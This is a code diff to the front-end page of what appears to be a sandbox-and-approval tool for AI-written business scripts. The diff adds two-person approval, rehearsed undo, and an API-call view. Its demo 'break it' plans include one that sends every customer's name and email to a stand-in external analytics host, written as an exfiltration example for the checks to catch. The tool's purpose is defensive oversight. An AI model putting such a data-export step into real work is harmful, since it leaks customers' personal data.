@@ -3,11 +3,12 @@
 import Link from "next/link";
 import { useCallback, useEffect, useMemo, useRef, useState } from "react";
 import { toast } from "sonner";
-import { ArrowRight, Ban, Bot, Check, CircleDashed, FlaskConical, Loader2, Lock, RotateCcw, ShieldAlert, ShieldCheck, Sparkles, User, Wrench, X } from "lucide-react";
+import { ArrowRight, Ban, Bot, Check, CircleDashed, FlaskConical, Loader2, Lock, RotateCcw, ShieldAlert, ShieldCheck, Sparkles, Undo2, User, Users, Wrench, X } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { Textarea } from "@/components/ui/textarea";
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
 import { ApprovalCard, viewFromAttempt } from "@/components/approval-card";
+import { BlastRadius } from "@/components/blast-radius";
 import { AppHeader } from "@/components/app-header";
 import { api, num, usd, type Business, type Flag, type Health, type Run } from "@/lib/api";
 import { cn } from "@/lib/utils";
@@ -34,6 +35,34 @@ const BREAK_IT: { label: string; task: string; code: string }[] = [
         ctx.email.send(email, "We refunded your duplicate charge",
                        f"Hi {name.split()[0]},\\n\\nYou were charged twice for one order last week. "
                        f"We've refunded \${amount / 100:.2f}. Sorry about that!\\n\\nBean There Coffee Co.")
+` },
+  { label: "Obvious refund plan (rules miss it)", task: "Refund everyone who was double-charged last week and send them an apology email.", code: `def run(ctx):
+    # The obvious reading: same customer, same amount, same day = double charge. Passes every rule.
+    rows = ctx.db.execute("""
+        SELECT c.id, c.customer_id, c.amount_cents FROM charges c
+        JOIN (SELECT customer_id, amount_cents, date(created_at) d FROM charges
+              WHERE created_at >= '2026-10-26' AND status = 'succeeded'
+              GROUP BY customer_id, amount_cents, d HAVING COUNT(*) > 1) dup
+          ON c.customer_id = dup.customer_id AND c.amount_cents = dup.amount_cents AND date(c.created_at) = dup.d
+        WHERE c.id NOT IN (SELECT MIN(id) FROM charges WHERE created_at >= '2026-10-26'
+                           GROUP BY customer_id, amount_cents, date(created_at))""").fetchall()
+    for charge_id, customer_id, amount in rows:
+        ctx.db.execute("UPDATE charges SET status='refunded', refunded_at='2026-11-04' WHERE id=?", (charge_id,))
+        ctx.payments.refund(charge_id, amount, "double charge")
+        name, email = ctx.db.execute("SELECT name, email FROM customers WHERE id=?", (customer_id,)).fetchone()
+        ctx.email.send(email, "We refunded your duplicate charge", f"Hi {name.split()[0]}, we refunded \${amount / 100:.2f}. Sorry!")
+` },
+  { label: "Post the refund summary to Slack", task: "Tell #ops on Slack how many double charges we found last week.", code: `def run(ctx):
+    n, total = ctx.db.execute("""
+        SELECT COUNT(*), COALESCE(SUM(amount_cents), 0) FROM charges
+        WHERE created_at >= '2026-10-26' AND id NOT IN (SELECT MIN(id) FROM charges GROUP BY order_id)""").fetchone()
+    # Recorded in the sandbox; delivered through the Slack connector only after approval, with the real webhook.
+    ctx.http.post("https://hooks.slack.com/services/ops",
+                  json={"text": f"Found {n} double charges last week (\${total / 100:,.2f}). Refund plan coming for review."})
+` },
+  { label: "Leak customers to an unknown API", task: "Sync our customers to the new analytics tool", code: `def run(ctx):
+    rows = ctx.db.execute("SELECT name, email FROM customers").fetchall()
+    ctx.http.post("https://collector.analytics-free.example/v1/upload", json={"customers": rows})
 ` },
   { label: "VIP promo (ignores unsubscribes)", task: "Email our VIP customers a thank-you note with the code BEANS10 for 10% off.", code: `def run(ctx):
     for email, name in ctx.db.execute("SELECT email, name FROM customers WHERE vip = 1").fetchall():
@@ -136,6 +165,8 @@ export default function AppPage() {
   const attempt = run?.attempts.at(-1);
   const view = useMemo(() => (run && attempt ? viewFromAttempt(run.task, attempt, run.verdict, run.flags.length ? run.flags : attempt.flags) : null), [run, attempt]);
   const critical = !!attempt?.flags.some((f) => f.severity === "critical");
+  const needed = attempt?.approvals_required ?? 1;
+  const approvalsSoFar = (run?.approvals ?? []);
   const containment = useMemo(() => {
     if (!attempt) return null;
     const hit = Object.entries(attempt.consequences.tables).find(([, t]) => t.dropped || (t.rows_before > 0 && t.deleted / t.rows_before >= 0.05));
@@ -169,6 +200,14 @@ export default function AppPage() {
     } finally {
       setBusy(false);
     }
+  }
+
+  async function undo() {
+    if (!run) return;
+    setBusy(true);
+    try { const { id } = await api.rollback(run.id); setRun(await api.run(id)); toast.success("Undo rehearsed. It needs two approvers."); }
+    catch (e) { toast.error((e as Error).message); }
+    finally { setBusy(false); }
   }
 
   async function reset() {
@@ -326,6 +365,13 @@ export default function AppPage() {
                 </div>
               ) : null}
 
+              {run.mode === "rollback" ? (
+                <div className="flex items-start gap-3 rounded-2xl border bg-card p-4 text-sm">
+                  <Undo2 className="mt-0.5 size-4 shrink-0" />
+                  <div>This is the undo of <a className="underline underline-offset-4" href={`/app?run=${run.rollback_of}`}>{run.rollback_of}</a>: its approved data changes, inverted. Rows go back only if nobody touched them since (drift check). Refunds, emails and API calls already happened and are not reversed.</div>
+                </div>
+              ) : null}
+
               {run.attempts.length > 1 ? <AttemptCompare attempts={run.attempts} /> : null}
 
               <ApprovalCard view={view} label={run.status === "applied" ? "Applied" : run.status === "rejected" ? "Rejected" : run.status === "drifted" ? "Drift detected" : run.status === "failed" ? "Failed" : critical ? "Blocked by policy" : "Approval required"}
@@ -337,8 +383,16 @@ export default function AppPage() {
                     {!critical ? <input value={approver} onChange={(e) => setApprover(e.target.value)} placeholder="Your name (for the audit trail)" maxLength={80}
                       aria-label="Approver name" className="h-10 min-w-0 flex-1 rounded-full border bg-background px-4 text-sm outline-none focus-visible:ring-2 focus-visible:ring-ring/50 sm:ml-auto sm:max-w-[240px]" /> : <span className="sm:ml-auto" />}
                     <Button className="h-10 rounded-full px-4" onClick={() => act("approve")} disabled={busy || critical || !attempt?.consequences.ok}>
-                      {critical ? <><Lock className="size-4" /> Blocked by policy</> : <><Check className="size-4" /> Approve and apply</>}
+                      {critical ? <><Lock className="size-4" /> Blocked by policy</> : needed > 1 && approvalsSoFar.length === 0 ? <><Users className="size-4" /> First approval (1 of 2)</>
+                        : needed > 1 ? <><Check className="size-4" /> Second approval and apply</> : <><Check className="size-4" /> Approve and apply</>}
                     </Button>
+                    {needed > 1 && !critical ? (
+                      <div className="flex w-full flex-wrap items-center gap-2 rounded-lg border bg-background px-3 py-2 text-sm">
+                        <Users className="size-4 shrink-0" />
+                        <span>Two different people must approve: {attempt?.approval_reasons?.join(", ")}.</span>
+                        <span className="ml-auto font-mono text-xs text-muted-foreground">{approvalsSoFar.length ? `approved by ${approvalsSoFar.map((x) => x.name).join(", ")} · waiting for a second person` : "0 of 2 approvals"}</span>
+                      </div>
+                    ) : null}
                   </>
                 ) : null}
                 {run.status === "drifted" ? <Button className="h-10 rounded-full px-4" onClick={start} disabled={busy}><RotateCcw className="size-4" /> Rehearse again</Button> : null}
@@ -350,13 +404,20 @@ export default function AppPage() {
                   <div className="flex flex-wrap items-center justify-between gap-2"><div className="flex items-center gap-2 font-medium"><Check className="size-4" /> Applied for real</div>
                     {run.approval ? <span className="font-mono text-[11px] text-muted-foreground">approved by {run.approval.approver} · plan {run.approval.plan_sha256.slice(0, 12)}</span> : null}</div>
                   <div className="mt-3 grid gap-2 font-mono text-[13px] sm:grid-cols-2">
-                    {[["drift check", "passed"], ["database rows", num(run.apply_result.rows_written ?? 0)], ["BeanPay refunds", `${num(run.apply_result.refunds ?? 0)} · ${usd(run.apply_result.refund_total_cents ?? 0)}`], ["emails delivered", num(run.apply_result.emails_sent ?? 0)]].map(([k, v]) => (
+                    {[["drift check", "passed"], ["database rows", num(run.apply_result.rows_written ?? 0)], ["BeanPay refunds", `${num(run.apply_result.refunds ?? 0)} · ${usd(run.apply_result.refund_total_cents ?? 0)}`], ["emails delivered", num(run.apply_result.emails_sent ?? 0)], ["API calls delivered", num(run.apply_result.http_delivered ?? 0)]].map(([k, v]) => (
                       <div key={k} className="flex justify-between gap-3 rounded-lg border bg-background px-3 py-2"><span className="text-muted-foreground">{k}</span><span>{v}</span></div>
                     ))}
                   </div>
+                  {run.mode !== "rollback" ? (
+                    <div className="mt-4 flex flex-wrap items-center justify-between gap-3 border-t pt-4">
+                      <p className="text-sm text-muted-foreground">{run.rolled_back_by ? <>Its data changes were rolled back by <a className="underline underline-offset-4" href={`/app?run=${run.rolled_back_by}`}>{run.rolled_back_by}</a>.</> : "Approved something you regret? Undo the data changes. The undo is rehearsed and approved too."}</p>
+                      {!run.rolled_back_by ? <Button variant="outline" className="h-9 rounded-full px-4" disabled={busy} onClick={undo}><Undo2 className="size-4" /> Rehearse an undo</Button> : null}
+                    </div>
+                  ) : null}
                 </div>
               ) : null}
 
+              {attempt ? <BlastRadius c={attempt.consequences} /> : null}
               {attempt ? <Details attempt={attempt} events={run.events} /> : null}
             </>
           )}
@@ -381,6 +442,9 @@ const RULES: { rule: string; label: string }[] = [
   { rule: "warn_vip_emails", label: "VIP recipients flagged" },
   { rule: "duplicate_emails", label: "Nobody gets the same email twice" },
   { rule: "unknown_recipients", label: "Every recipient is a customer" },
+  { rule: "connectors_only", label: "API calls go through approved connectors" },
+  { rule: "max_update_pct_protected", label: "Protected tables aren't mass-rewritten" },
+  { rule: "invalid_recipients", label: "Every email has one valid address" },
 ];
 
 function Checks({ attempt, events }: { attempt: NonNullable<Run["attempts"][number]>; events: Run["events"] }) {
@@ -431,6 +495,7 @@ function Details({ attempt, events }: { attempt: NonNullable<Run["attempts"][num
           <TabsTrigger value="rows">Rows</TabsTrigger>
           <TabsTrigger value="emails">Emails · {num(c.emails.count)}</TabsTrigger>
           <TabsTrigger value="refunds">Refunds · {num(c.payments.count)}</TabsTrigger>
+          <TabsTrigger value="http">API calls · {num(c.http?.count ?? 0)}</TabsTrigger>
           <TabsTrigger value="sandbox">Sandbox</TabsTrigger>
           <TabsTrigger value="code">Code</TabsTrigger>
         </TabsList>
@@ -470,6 +535,14 @@ function Details({ attempt, events }: { attempt: NonNullable<Run["attempts"][num
               <div className="flex justify-between px-3 pt-1 text-foreground"><span>total</span><span>{usd(c.payments.total_cents)}</span></div>
             </div>
           ) : <p className="text-sm text-muted-foreground">No money would move.</p>}
+        </TabsContent>
+        <TabsContent value="http" className="space-y-2 pt-3">
+          {c.http?.samples.length ? c.http.samples.slice(0, 10).map((h, i) => (
+            <div key={i} className="rounded-lg border bg-background p-3">
+              <div className="flex flex-wrap items-center gap-2 font-mono text-[12px]"><span className="rounded bg-muted px-1.5 py-0.5">{h.method}</span><span className="break-all">{h.url}</span></div>
+              <pre className="mt-2 max-h-40 overflow-auto font-mono text-[11px] text-muted-foreground">{JSON.stringify(h.json, null, 2)}</pre>
+            </div>
+          )) : <p className="text-sm text-muted-foreground">No API calls. Plans call APIs with <span className="font-mono">ctx.http.post(...)</span>; calls are recorded here and delivered through a connector, with real credentials, only after approval.</p>}
         </TabsContent>
         <TabsContent value="sandbox" className="pt-3">
           <div className="grid gap-1.5 font-mono text-[12px] sm:grid-cols-2">
